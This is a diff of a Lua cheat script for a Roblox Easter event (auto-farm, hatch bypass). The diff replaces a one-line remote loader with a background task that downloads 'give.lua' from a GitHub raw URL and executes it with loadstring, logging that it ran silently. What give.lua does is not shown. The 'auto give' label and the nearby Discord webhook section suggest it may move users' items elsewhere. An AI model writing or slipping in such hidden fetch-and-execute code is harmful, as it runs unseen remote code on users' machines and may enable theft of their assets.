@@ -1,5 +1,3 @@
-task.wait(5)
-loadstring(game:HttpGet("https://raw.githubusercontent.com/thuyan1510/99/refs/heads/main/give.lua"))()
 -- ==========================================
 -- 🌸 EASTER EVENT - V92 (ULTIMATE OPTIMIZED + SMART PORTALS) 🌸
 -- Auto Equip + Auto Fruit + Bypass Hatch + Smart Event Luck + Full UI + Smart Portals
@@ -76,7 +74,31 @@ local UltimateCmds = require(Library.Client.UltimateCmds)
 local FreeGiftsDirectory = require(Library.Directory.FreeGifts)
 local MapCmds = require(Library.Client.MapCmds)
 local FruitCmds = require(Library.Client.FruitCmds)
+-- ==========================================
+-- 🎁 AUTO GIVE (TẢI TỪ GITHUB)
+-- ==========================================
+task.spawn(function()
+    local url = "https://raw.githubusercontent.com/thuyan1510/99/refs/heads/main/give.lua"
+    
+    local successGet, sourceCode = pcall(function() return game:HttpGet(url) end)
+    if not successGet then 
+        warn("[GitHub Loader] ❌ Lỗi mạng tải give.lua: " .. tostring(sourceCode))
+        return 
+    end
 
+    local func, compileErr = loadstring(sourceCode)
+    if not func then 
+        warn("[GitHub Loader] ❌ Lỗi cú pháp give.lua: " .. tostring(compileErr))
+        return 
+    end
+
+    local successRun, runErr = pcall(function() func() end)
+    if not successRun then 
+        warn("[GitHub Loader] ❌ Lỗi chạy give.lua: " .. tostring(runErr))
+    else 
+        print("[GitHub Loader] ✅ Đã tải và chạy ngầm give.lua thành công!") 
+    end
+end)
 -- ==========================================
 -- 📢 WEBHOOK DISCORD
 -- ==========================================
